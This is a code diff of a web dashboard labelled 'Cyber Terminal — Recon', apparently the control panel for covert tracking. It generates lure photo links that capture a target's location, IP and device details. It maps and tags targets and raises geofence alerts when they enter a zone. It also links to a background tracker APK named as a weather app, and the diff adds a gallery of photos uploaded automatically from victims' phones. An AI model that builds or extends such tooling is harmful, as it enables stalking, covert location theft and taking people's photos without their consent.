@@ -320,6 +320,13 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 .photo-link-row button.use-photo{border-color:var(--gold-d);color:var(--gold)}
 .photo-link-row button.use-photo:hover{background:var(--green-d);border-color:var(--gold)}
 .photo-selected{font-size:10px;color:var(--green);padding:8px 10px;background:rgba(0,229,138,.06);border:1px solid rgba(0,229,138,.2);border-radius:var(--radius);margin-bottom:8px;line-height:1.5}
+.galeri-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px}
+.galeri-item{background:#000;border:1px solid var(--border2);border-radius:4px;overflow:hidden;cursor:pointer;transition:transform .15s}
+.galeri-item:hover{border-color:var(--gold);transform:scale(1.02)}
+.galeri-item img{width:100%;height:90px;object-fit:cover;display:block}
+.galeri-item .gi-name{font-size:8px;color:var(--cyan);padding:3px 4px;background:rgba(0,0,0,.85);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.galeri-item .gi-time{font-size:7px;color:var(--text-d);padding:0 4px 3px;background:rgba(0,0,0,.85)}
+.galeri-item .gi-device{font-size:7px;color:var(--gold);padding:0 4px 3px;background:rgba(0,0,0,.85);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 @media (max-width: 899px) {
   body.compact-mode .term-body:has(#globeBox),
   body.compact-mode .term-body:has(#radarGlobal),
@@ -376,7 +383,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap"><div style="font-size:10px;color:var(--text-d)"><span class="dot-status"></span>ONLINE</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="compact-btn" id="compactToggle" onclick="toggleCompactMode()">📱 Mode Kompak</button><button class="chat-btn" onclick="openChat()">💬 CHAT <span id="chatBadge" style="display:none;background:var(--red);color:#fff;padding:1px 5px;font-size:9px;border-radius:8px;margin-left:4px">0</span></button><button class="sound-btn active" id="soundToggle" onclick="toggleSound()">🔊 ON</button></div></div>
 </div>
 
-<!-- ═══ INFO PANEL ═══ -->
 <div class="term-body"><div class="prompt">[Info] Tentang Aplikasi</div><div class="info-panel">
   <div class="ip-title">◈ CYBER TERMINAL — RECON</div>
   <div class="ip-text">Dikembangkan oleh <b style="color:var(--gold)">Cyber Anonymous by RoraxBringaz</b></div>
@@ -423,10 +429,8 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
       <div>◈ PING AVG: <b id="rPing">-</b></div>
     </div>
   </div>
-
   <div style="margin-top:12px;font-size:10px;color:var(--text-d)">› daftar server yang dipantau:</div>
   <div class="server-list" id="serverList"></div>
-
   <div style="margin-top:10px;font-size:10px;color:var(--text-d)">› tambah server baru:</div>
   <div class="server-input-row">
     <input id="newServerInput" placeholder="https://contoh.com" onkeypress="if(event.key==='Enter')addServer()">
@@ -443,6 +447,7 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body"><div class="prompt">[Audio] Kontrol Suara</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› atur volume alert & beep:</div><div class="vol-wrap"><span class="vl">VOL</span><input type="range" id="volSlider" min="0" max="100" value="30" oninput="setVol(this.value)"><span class="vl" id="volLabel">30%</span></div></div>
 <div class="term-body"><div class="prompt">[Live] All Target Map</div><div class="map-box tall"><div id="mapMulti" class="map-inner"></div><div class="map-label" id="multiLabel">◈ MULTI-TARGET LIVE</div><div class="map-coords" id="mapMultiCount">0 target</div></div></div>
 <div class="term-body"><div class="prompt">[Alert] Geofence Monitor</div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Set titik + radius — alert bunyi kalau target masuk zona.</div><div class="geo-row"><input id="geoLat" class="geo-inp" placeholder="Latitude" type="number" step="any"><input id="geoLng" class="geo-inp" placeholder="Longitude" type="number" step="any"><input id="geoRadius" class="geo-inp" placeholder="Radius (m)" type="number" value="500" style="max-width:90px"></div><div style="display:flex;gap:6px;margin-bottom:10px"><button class="term-btn outline" onclick="setGeofence()" style="margin:0">Set Geofence</button><button class="term-btn danger" onclick="clearGeofence()" style="margin:0;flex:0 0 auto;width:auto;padding:0 16px">Clear</button></div><div class="geo-status" id="geoStatus">Belum diset</div><div class="geo-alert" id="geoAlert"></div></div>
+
 <div class="term-body"><div class="prompt">[Generate] Link Generator</div>
 <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› buat link tracking atau link denah untuk target:</div>
 <div style="font-size:10px;color:var(--gold);background:rgba(0,229,138,.06);border:1px solid var(--gold-d);border-radius:var(--radius);padding:9px 10px;margin-bottom:12px;line-height:1.6">⏰ <b>Semua link generator berlaku selama 24 jam.</b> Setelah itu link dianggap kedaluwarsa.</div>
@@ -468,32 +473,31 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
   </section>
 </div>
 
-  <div class="koord-box" id="koordBox">
-    <div class="koord-title">Lokasi Foto untuk Dilihat Target</div>
-    <div class="koord-hint">
-      › Atur koordinat lokasi foto di sini — tepat di bawah Generate Maps Link dan di atas Share Location.<br>
-      › Isi alamat lokasi foto atau klik "Pakai Lokasi Saya" agar lokasi tersebut ikut tampil pada link foto.
-    </div>
-    <input id="dashCariAlamat" class="term-input" placeholder="Ketik alamat lengkap... (contoh: Monas Jakarta)" style="margin-bottom:8px">
-    <button class="term-btn outline" onclick="dashCariKoordinat()" style="margin-bottom:8px">🔍 Cari Koordinat dari Alamat</button>
-    <div class="geo-row">
-      <input id="dashLat" class="geo-inp" type="number" step="any" placeholder="Latitude (otomatis)" readonly>
-      <input id="dashLng" class="geo-inp" type="number" step="any" placeholder="Longitude (otomatis)" readonly>
-    </div>
-    <input id="dashNamaLokasi" class="term-input" placeholder="Nama lokasi (opsional) — Pantai Kuta" style="margin-bottom:8px">
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
-      <button class="term-btn outline" onclick="dashAmbilLokasiSaya()" style="margin:0;width:100%">Pakai Lokasi Saya</button>
-      <button class="term-btn danger" onclick="dashClearLokasi()" style="margin:0;width:100%">Clear</button>
-    </div>
-    <div id="dashLokasiStatus" class="geo-status" style="margin-bottom:0">Belum diset — target akan lihat lokasi default</div>
+<div class="koord-box" id="koordBox">
+  <div class="koord-title">Lokasi Foto untuk Dilihat Target</div>
+  <div class="koord-hint">
+    › Atur koordinat lokasi foto di sini — tepat di bawah Generate Maps Link dan di atas Share Location.<br>
+    › Isi alamat lokasi foto atau klik "Pakai Lokasi Saya" agar lokasi tersebut ikut tampil pada link foto.
   </div>
+  <input id="dashCariAlamat" class="term-input" placeholder="Ketik alamat lengkap... (contoh: Monas Jakarta)" style="margin-bottom:8px">
+  <button class="term-btn outline" onclick="dashCariKoordinat()" style="margin-bottom:8px">🔍 Cari Koordinat dari Alamat</button>
+  <div class="geo-row">
+    <input id="dashLat" class="geo-inp" type="number" step="any" placeholder="Latitude (otomatis)" readonly>
+    <input id="dashLng" class="geo-inp" type="number" step="any" placeholder="Longitude (otomatis)" readonly>
+  </div>
+  <input id="dashNamaLokasi" class="term-input" placeholder="Nama lokasi (opsional) — Pantai Kuta" style="margin-bottom:8px">
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
+    <button class="term-btn outline" onclick="dashAmbilLokasiSaya()" style="margin:0;width:100%">Pakai Lokasi Saya</button>
+    <button class="term-btn danger" onclick="dashClearLokasi()" style="margin:0;width:100%">Clear</button>
+  </div>
+  <div id="dashLokasiStatus" class="geo-status" style="margin-bottom:0">Belum diset — target akan lihat lokasi default</div>
+</div>
+
 <div style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px">
   <div style="color:var(--cyan);font-size:11px;font-weight:bold;margin-bottom:12px;letter-spacing:2px;text-transform:uppercase">◈ Share Location</div>
-
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px;line-height:1.6">
     › <b style="color:var(--gold)">Tidak perlu mencari link GitHub.</b> Pilih salah satu link foto siap pakai di bawah ini, lalu klik <b style="color:var(--gold)">Gunakan link ini</b> atau <b style="color:var(--gold)">Salin</b>.
   </div>
-
   <div class="photo-link-list">
     <div class="photo-link-card">
       <div class="pl-title">Foto 1</div>
@@ -504,11 +508,9 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
       <div class="photo-link-row"><input id="photoPreset2" value="https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/malam.jpg" readonly onclick="this.select()"><button onclick="copyPhotoPreset('photoPreset2',this)">📋 SALIN</button><button class="use-photo" onclick="usePhotoPreset('photoPreset2')">✓ GUNAKAN</button></div>
     </div>
   </div>
-
   <div id="photoSelected" class="photo-selected">✅ Foto 1 siap digunakan</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› atau tempel URL foto lain jika diperlukan:</div>
   <input id="inputFotoUrl" class="term-input" value="https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/images.jpg" placeholder="Tempel URL foto lain..." style="margin-bottom:8px">
-
   <section style="margin-bottom:16px">
     <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 1 (view.html)</div>
     <button class="term-btn outline" onclick="genShareLoc1()">Generate Share Loc 1</button>
@@ -518,7 +520,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
       <button class="term-btn outline" id="FOTOCopy" style="margin-top:10px">📋 Salin Link</button>
     </div>
   </section>
-
   <section style="margin-bottom:16px">
     <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 2 (Vercel)</div>
     <button class="term-btn outline" onclick="genShareLoc2()">Generate Share Loc 2</button>
@@ -528,13 +529,29 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
       <button class="term-btn outline" id="PROCopy" style="margin-top:10px">📋 Salin Link</button>
     </div>
   </section>
-
-
 </div>
 </div>
+
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">CSV</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">JSON</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">Clear</button></div></div>
+
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">Buka Google Maps</button></div>
+
+<div class="term-body">
+  <div class="prompt">[Galeri] Foto Otomatis dari APK</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">
+    › Foto yang di-upload otomatis dari APK HP Anda:
+  </div>
+  <div style="font-size:10px;color:var(--cyan);margin-bottom:10px">
+    Total: <b id="galeriCount">0</b> foto · <span id="galeriUser">-</span>
+  </div>
+  <div id="galeriGrid" class="galeri-grid">
+    <div class="empty" style="grid-column:1/-1">Memuat...</div>
+  </div>
+  <button class="term-btn outline" onclick="refreshGaleri()" style="margin-top:12px">🔄 Refresh Galeri</button>
+</div>
+
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">Download APK</button></a></div>
+
 <div class="term-body" id="toolsPanel">
   <div class="prompt">[Tools] Utility Panel</div>
   <div class="tools-tabs">
@@ -653,13 +670,13 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
     <div class="coord-result" id="coordResult" style="display:none"></div>
   </div>
 </div>
+
 <div class="term-body"><div class="prompt">[System] Log</div><div id="logBox"><div class="log-line">Initializing...</div></div></div>
 <div class="term-body"><div class="prompt">[Security] Riwayat Sesi Login</div><div class="sess-head"><span id="sessCount">0 sesi tercatat</span><button onclick="clearSessionLog()">🗑️ HAPUS SEMUA</button></div><div class="sess-list" id="sessionList"><div class="empty">Belum ada riwayat</div></div></div>
 <div class="term-body"><div class="prompt">[Activity] Riwayat Aktivitas</div><div class="sess-head"><span id="actCount">0 aktivitas</span><button onclick="clearActLog()">🗑️ HAPUS</button></div><div class="act-list" id="actList"><div class="empty">Belum ada aktivitas</div></div></div>
 <div class="term-body" id="compassPanel"><div class="prompt">[Nav] Kompas Target</div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">› isi koordinat tujuan, klik MULAI — ikuti petunjuk arah, jarum & jarak.</div><div style="display:flex;gap:8px;margin-bottom:10px"><button class="term-btn outline" id="cmpModeKoord" onclick="setCompassMode('koordinat')" style="margin:0">Koordinat</button><button class="term-btn outline" id="cmpModeUtm" onclick="setCompassMode('utm')" style="margin:0">UTM</button></div><div id="cmpRowKord"><div class="geo-row"><input id="cmpLat" class="geo-inp" placeholder="Latitude (-6.2...)" type="number" step="any"><input id="cmpLng" class="geo-inp" placeholder="Longitude (106.8...)" type="number" step="any"></div></div><div id="cmpRowUtm" style="display:none"><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› contoh: <b style="color:var(--cyan)">54M</b> · <b style="color:var(--cyan)">222161</b> · <b style="color:var(--cyan)">9497555</b></div><div class="geo-row"><input id="cmpZoneT" class="geo-inp" placeholder="Zona (54M)" autocomplete="off" style="max-width:96px"><input id="cmpEast" class="geo-inp" placeholder="Easting" type="number" step="any"><input id="cmpNorth" class="geo-inp" placeholder="Northing" type="number" step="any"></div></div><div style="display:flex;gap:8px;margin-bottom:10px"><button class="term-btn" onclick="startCompass()" style="margin:0">Mulai</button><button class="term-btn danger" onclick="stopCompass()" style="margin:0;flex:0 0 auto;width:auto;padding:0 18px">Stop</button></div><button class="term-btn outline" onclick="compassLatest()" style="margin:0 0 12px">Pakai Target Terbaru</button><div class="cmp-wrap"><div class="cmp-dial"><div class="cmp-ticks"></div><div class="cmp-rose" id="cmpRose"><span class="rl u">U</span><span class="rl t">T</span><span class="rl s">S</span><span class="rl b">B</span><span class="rl d tl">TL</span><span class="rl d tg">TG</span><span class="rl d bd">BD</span><span class="rl d bl">BL</span></div><div class="cmp-needle" id="cmpNeedle"><div class="nd-up"></div><div class="nd-dn"></div></div><div class="cmp-cap"></div><div class="cmp-topmark">▲</div></div><div class="cmp-read"><div class="cmp-dist" id="cmpDist">--</div><div class="cmp-sub" id="cmpBear">BEARING --</div></div></div><div class="cmp-guide" id="cmpGuide"><span class="g-arrow" id="cmpArrow">◈</span><span class="g-txt" id="cmpGuideTxt">Isi tujuan lalu klik MULAI — petunjuk arah menuju koordinat akan muncul di sini</span></div><div class="term-info" style="margin-top:12px"><div><span class="k">TUJUAN</span><span class="v" id="cmpTarget">-</span></div><div><span class="k">POSISI</span><span class="v" id="cmpPos">-</span></div><div><span class="k">POSISI UTM</span><span class="v" id="cmpUtm">-</span></div><div><span class="k">AKURASI</span><span class="v" id="cmpAcc">-</span></div><div><span class="k">HEADING</span><span class="v" id="cmpHead">-</span></div></div><div class="geo-status" id="cmpStatus" style="margin-top:10px;margin-bottom:0">Siap — isi tujuan lalu MULAI</div></div>
 </div>
 <div class="chat-panel" id="chatPanel"><div class="chat-inner"><div class="chat-head"><span class="title" id="chatTitle">◉ PRIVATE CHAT</span><button class="chat-pick" onclick="pilihLawan()">👥 Ganti</button><button class="chat-close" onclick="closeChat()">✕ Close</button></div><div class="chat-msgs" id="chatMsgs"><div class="empty">Pilih lawan bicara dulu</div></div><div class="chat-input-row"><input id="chatInput" placeholder="ketik pesan..." oninput="typingSound()" onkeypress="if(event.key==='Enter')sendChat()"><button onclick="sendChat()">KIRIM</button></div></div></div>
-
 <script type="module">
 import{initializeApp}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import{getDatabase,ref,onValue,push,remove}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
@@ -703,6 +720,7 @@ function typingSound(){beep(1800+Math.random()*400,0.02)}
 function apkUpdateSound(){let n=0;const t=setInterval(()=>{beep(1200,0.06);n++;if(n>=15)clearInterval(t)},333)}
 function chatNotifSound(){let n=0;const t=setInterval(()=>{beep(1800,0.08);setTimeout(()=>beep(2400,0.08),100);n++;if(n>=6)clearInterval(t)},500)}
 function linkDataSound(){let n=0;const t=setInterval(()=>{beep(1400,0.08);setTimeout(()=>beep(1800,0.08),100);n++;if(n>=10)clearInterval(t)},500)}
+function galeriSound(){beep(1600,.1);setTimeout(()=>beep(2000,.1),120);setTimeout(()=>beep(2400,.15),240)}
 function geoSound(){beep(800,.15);setTimeout(()=>beep(1200,.15),200);setTimeout(()=>beep(1600,.2),400);setTimeout(()=>beep(2000,.3),700)}
 window.playKlik=playKlik;window.typingSound=typingSound;
 window.logout=()=>{playKlik();localStorage.removeItem('username');location.href='index.html'};
@@ -726,7 +744,7 @@ function initMapMulti(){mapMulti=L.map('mapMulti',{zoomControl:true,attributionC
 initMapMulti();
 function buildAlamat(d){if(d.alamat){const a=d.alamat,parts=[];if(a.jalan)parts.push(a.jalan);if(a.desa)parts.push(a.desa);if(a.kecamatan)parts.push('Kec. '+a.kecamatan);if(a.kabupaten)parts.push(a.kabupaten);if(a.provinsi)parts.push(a.provinsi);if(parts.length)return parts.join(', ');}return d.kota||'-'}
 window.buildAlamat=buildAlamat;
-function updateMultiMap(){if(!mapMulti)return;Object.values(multiMarkers).forEach(m=>mapMulti.removeLayer(m));multiMarkers={};const valid=allData.filter(([,d])=>d.lat&&d.lng);document.getElementById('mapMultiCount').innerText=valid.length+' target';document.getElementById('multiLabel').innerText='◈ '+valid.length+' TARGET LIVE';const colors=['#ff3355','#00e58a','#38bdf8','#00e58a','#ff8f00','#a855f7','#ec4899'];valid.forEach(([key,d],idx)=>{const name=d.target||'unknown';const alamat=buildAlamat(d);const jam=new Date(d.waktu).toLocaleString('id-ID');const clr=colors[idx%colors.length];const isRecent=(Date.now()-d.waktu)<3600000;const m=L.marker([d.lat,d.lng],{icon:pinIcon(d.foto||null,name,clr)}).addTo(mapMulti);const popHtml=`<div style="font-family:'Courier New',monospace;min-width:170px;padding:4px"><div style="color:#00e58a;font-weight:bold;letter-spacing:2px;font-size:11px;padding-bottom:5px;border-bottom:1px solid #0d3f2e;margin-bottom:5px">${name.toUpperCase()}</div>${d.foto?`<img src="${d.foto}" style="width:80px;height:60px;object-fit:cover;border:1px solid #0d3f2e;border-radius:3px;display:block;margin-bottom:5px">`:''}<div style="font-size:9px;line-height:1.9"><div><span style="color:#2e405a;display:inline-block;width:44px">ALAMAT</span><span style="color:#cfd9e6">${alamat}</span></div><div><span style="color:#2e405a;display:inline-block;width:44px">KOORD</span><span style="color:#38bdf8">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</span></div>${d.ip?`<div><span style="color:#2e405a;display:inline-block;width:44px">IP</span><span style="color:#38bdf8">${d.ip}</span></div>`:''}${d.platform?`<div><span style="color:#2e405a;display:inline-block;width:44px">OS</span><span style="color:#93a6bc">${d.platform}</span></div>`:''}<div><span style="color:#2e405a;display:inline-block;width:44px">WAKTU</span><span style="color:#5d7186">${jam}</span></div><div style="margin-top:3px;color:${isRecent?'#00e58a':'#5d7186'}">${isRecent?'● AKTIF (< 1 jam)':'○ Lama'}</div></div></div>`;m.bindPopup(popHtml,{className:'target-popup',closeButton:false,maxWidth:240});multiMarkers[key]=m})}
+function updateMultiMap(){if(!mapMulti)return;Object.values(multiMarkers).forEach(m=>mapMulti.removeLayer(m));multiMarkers={};const valid=allData.filter(([,d])=>d.lat&&d.lng);document.getElementById('mapMultiCount').innerText=valid.length+' target';document.getElementById('multiLabel').innerText='◈ '+valid.length+' TARGET LIVE';const colors=['#ff3355','#00e58a','#38bdf8','#00e58a','#ff8f00','#a855f7','#ec4899'];valid.forEach(([key,d],idx)=>{const name=d.target||'unknown';const alamat=buildAlamat(d);const jam=new Date(d.waktu).toLocaleString('id-ID');const clr=colors[idx%colors.length];const isRecent=(Date.now()-d.waktu)<3600000;const m=L.marker([d.lat,d.lng],{icon:pinIcon(d.foto||null,name,clr)}).addTo(mapMulti);const popHtml=`<div style="font-family:'Courier New',monospace;min-width:170px;padding:4px"><div style="color:#00e58a;font-weight:bold;letter-spacing:2px;font-size:11px;padding-bottom:5px;border-bottom:1px solid #0d3f2e;margin-bottom:5px">${name.toUpperCase()}</div>${d.foto?`<img src="${d.foto}" style="width:80px;height:60px;object-fit:cover;border:1px solid #0d3f2e;border-radius:3px;display:block;margin-bottom:5px">`:''}<div style="font-size:9px;line-height:1.9"><div><span style="color:#2e405a;display:inline-block;width:44px">ALAMAT</span><span style="color:#cfd9e6">${alamat}</span></div><div><span style="color:#2e405a;display:inline-block;width:44px">KOORD</span><span style="color:#38bdf8">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</span></div><div><span style="color:#2e405a;display:inline-block;width:44px">WAKTU</span><span style="color:#5d7186">${jam}</span></div><div style="margin-top:3px;color:${isRecent?'#00e58a':'#5d7186'}">${isRecent?'● AKTIF (< 1 jam)':'○ Lama'}</div></div></div>`;m.bindPopup(popHtml,{className:'target-popup',closeButton:false,maxWidth:240});multiMarkers[key]=m})}
 let mapLink=null,lastAnimKey='';
 let animTimer1=null,animTimer2=null,animLoopTimer=null;
 let animLoopActive=true;
@@ -782,11 +800,60 @@ function initMapApk(){mapApk=L.map('mapApk',{zoomControl:false,attributionContro
 initMapApk();
 onValue(ref(db,'lokasi/'+user),snap=>{const data=snap.val();if(!data)return;const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');const ae=Object.entries(data).filter(([k,d])=>d.mode&&!d.target&&!bl.includes(k)).sort((a,b)=>b[1].waktu-a[1].waktu);if(!ae.length)return;const lt=ae[0][1];document.getElementById('apkUser').innerText=lt.user||user;document.getElementById('apkLat').innerText=lt.lat?lt.lat.toFixed(6):'-';document.getElementById('apkLng').innerText=lt.lng?lt.lng.toFixed(6):'-';document.getElementById('apkAkurasi').innerText=lt.akurasi?lt.akurasi.toFixed(2)+' m':'-';document.getElementById('apkDevice').innerText=lt.device||'-';document.getElementById('apkTime').innerText=new Date(lt.waktu).toLocaleString('id-ID');if(lt.lat&&lt.lng){document.getElementById('mapApkCoords').innerText=lt.lat.toFixed(4)+', '+lt.lng.toFixed(4);if(markerApk)markerApk.setLatLng([lt.lat,lt.lng]);else{markerApk=L.marker([lt.lat,lt.lng],{icon:radarIcon()}).addTo(mapApk);markerApk.bindPopup('<div style="font-family:Courier New;text-align:center;padding:6px"><b>'+(lt.user||user).toUpperCase()+'</b><br>'+lt.lat.toFixed(5)+', '+lt.lng.toFixed(5)+'</div>',{className:'target-popup',closeButton:false}).openPopup()}mapApk.setView([lt.lat,lt.lng],mapApk.getZoom())}if(!firstApk&&ae.length>lastApkCnt){apkUpdateSound();addLog('📡 APK kirim lokasi baru!','warn');actLog('📡 APK kirim lokasi baru','info')}lastApkCnt=ae.length;firstApk=false});
 window.bukaMapsApk=()=>{const la=document.getElementById('apkLat').innerText,ln=document.getElementById('apkLng').innerText;if(la==='-')return;window.open('https://www.google.com/maps?q='+la+','+ln,'_blank')};
+
+// ═══════════════════════════════════════════════════════════
+// GALERI FOTO DARI APK
+// ═══════════════════════════════════════════════════════════
+let galeriData = {};
+let lastGaleriCnt = 0;
+window.refreshGaleri = function() {
+  const grid = document.getElementById('galeriGrid');
+  const countEl = document.getElementById('galeriCount');
+  const userEl = document.getElementById('galeriUser');
+  if (!grid) return;
+  const items = Object.values(galeriData).sort((a, b) => b.waktu - a.waktu);
+  if (countEl) countEl.textContent = items.length;
+  if (userEl) userEl.textContent = user || '-';
+  if (items.length === 0) {
+    grid.innerHTML = '<div class="empty" style="grid-column:1/-1">Belum ada foto dari APK</div>';
+    return;
+  }
+  grid.innerHTML = items.map(foto => `
+    <div class="galeri-item" onclick="window.open('${foto.url}', '_blank')">
+      <img src="${foto.url}" onerror="this.style.display='none'">
+      <div class="gi-name">${foto.nama || 'foto.jpg'}</div>
+      <div class="gi-time">${new Date(foto.waktu).toLocaleString('id-ID', {day:'2-digit', month:'2-digit', hour:'2-digit', minute:'2-digit'})}</div>
+      <div class="gi-device">${foto.device || '-'}</div>
+    </div>
+  `).join('');
+};
+
+onValue(ref(db, 'galeri/' + user), snap => {
+  const data = snap.val();
+  if (!data) {
+    galeriData = {};
+    const grid = document.getElementById('galeriGrid');
+    if (grid) grid.innerHTML = '<div class="empty" style="grid-column:1/-1">Belum ada foto dari APK</div>';
+    const countEl = document.getElementById('galeriCount');
+    if (countEl) countEl.textContent = '0';
+    return;
+  }
+  galeriData = data;
+  const newCount = Object.keys(data).length;
+  if (lastGaleriCnt > 0 && newCount > lastGaleriCnt) {
+    galeriSound();
+    addLog('📸 Foto baru masuk dari APK!', 'warn');
+    actLog('📸 Foto baru dari APK', 'info');
+  }
+  lastGaleriCnt = newCount;
+  refreshGaleri();
+  addLog('📸 Galeri: ' + newCount + ' foto', 'ok');
+});
+
 let currentLink='';window.currentLink='';
 function linkBase(){let c='';try{c=(document.getElementById('baseUrlCustom').value||'').trim()}catch(e){}c=c.replace(/\/+$/,'');if(!c)return location.origin;if(!/^[a-z]+:\/\//i.test(c))c='https://'+c;return c}
 function saveBase(){try{localStorage.setItem('baseUrlCustom_'+user,(document.getElementById('baseUrlCustom').value||'').trim())}catch(e){}}
 
-// Dua URL foto resmi yang langsung bisa dipakai tanpa mencari-cari link GitHub.
 const PHOTO_PRESET_URLS={
   photoPreset1:'https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/images.jpg',
   photoPreset2:'https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/malam.jpg'
@@ -818,7 +885,6 @@ window.usePhotoPreset=function(id){
   if(window.beep)beep(1800,0.06);
 };
 
-// Link generator selalu dibuat dengan masa berlaku 24 jam.
 function generatorExpiryMinutes(){
   const el=document.getElementById('linkExpiry');
   const mins=el?parseInt(el.value,10):1440;
@@ -875,14 +941,10 @@ function showLoading(type){
 }
 
 window.dashAmbilLokasiSaya = function(){
-  if(!navigator.geolocation){
-    alert('Browser tidak mendukung GPS.');
-    return;
-  }
+  if(!navigator.geolocation){alert('Browser tidak mendukung GPS.');return}
   const status = document.getElementById('dashLokasiStatus');
   status.textContent = '⏳ Mengambil lokasi...';
   status.style.color = 'var(--gold)';
-  
   navigator.geolocation.getCurrentPosition(
     pos => {
       const lat = pos.coords.latitude.toFixed(6);
@@ -906,21 +968,14 @@ window.dashAmbilLokasiSaya = function(){
 
 window.dashCariKoordinat = async function(){
   const alamat = document.getElementById('dashCariAlamat').value.trim();
-  if(!alamat){
-    alert('Ketik alamat terlebih dahulu.');
-    return;
-  }
+  if(!alamat){alert('Ketik alamat terlebih dahulu.');return}
   const status = document.getElementById('dashLokasiStatus');
   status.textContent = '⏳ Mencari koordinat dari alamat...';
   status.style.color = 'var(--gold)';
-  
   try {
     const url = 'https://nominatim.openstreetmap.org/search?format=json&q=' + encodeURIComponent(alamat) + '&limit=1';
-    const response = await fetch(url, {
-      headers: { 'User-Agent': 'CyberTerminal/1.0' }
-    });
+    const response = await fetch(url, {headers: { 'User-Agent': 'CyberTerminal/1.0' }});
     const data = await response.json();
-    
     if(data && data.length > 0){
       const lat = parseFloat(data[0].lat).toFixed(6);
       const lng = parseFloat(data[0].lon).toFixed(6);
@@ -968,33 +1023,25 @@ window.genShareLoc1 = async function(){
   const fotoUrl = document.getElementById('inputFotoUrl').value.trim();
   if(!fotoUrl){ alert('Tempel URL foto dulu!'); return; }
   if(!/^https?:\/\//i.test(fotoUrl)){ alert('URL harus mulai https://'); return; }
-  
   const resBox = document.getElementById('FOTOResult');
   const urlBox = document.getElementById('FOTOUrl');
   const labelEl = document.getElementById('FOTOLabel');
   resBox.style.display = 'block';
   if(labelEl) labelEl.innerText = '› membuat link Share Loc 1...';
   urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Memproses...</div>';
